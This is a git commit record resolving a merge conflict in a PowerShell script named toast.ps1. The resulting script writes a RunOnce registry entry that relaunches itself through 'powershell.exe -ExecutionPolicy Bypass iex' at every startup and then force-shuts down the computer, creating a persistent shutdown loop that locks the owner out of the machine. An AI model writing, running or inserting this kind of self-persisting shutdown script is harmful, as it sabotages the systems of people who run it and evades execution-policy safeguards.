b9c04a0dac228151ae807c1a70334f700347606c
sdd4181 <69910407+sdd4181@users.noreply.github.com>
2022-02-24 11:37:57 -0500

    Update toast.ps1

--- toast.ps1
+++ toast.ps1
@@ -1,8 +1,4 @@
 #New-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce -Name Shutdown -PropertyType String -Value 'C:\Users\Schuyler\Desktop\toast.ps1'
-<<<<<<< HEAD
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v 'Shutdown' /t REG_SZ /d 'powershell.exe -ExecutionPolicy Bypass iex "C:\Users\Schuyler\Desktop\toast.ps1"'
 Stop-Computer -Force -ComputerName 127.0.0.1
-=======
-#reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v 'Shutdown' /t REG_SZ /d 'powershell.exe -ExecutionPolicy Bypass iex "C:\Users\Schuyler\Desktop\toast.ps1"'
-Stop-Computer -Force -ComputerName 127.0.0.1
->>>>>>> ebde5765bf300d7444ffba788468198ffeae6809
+
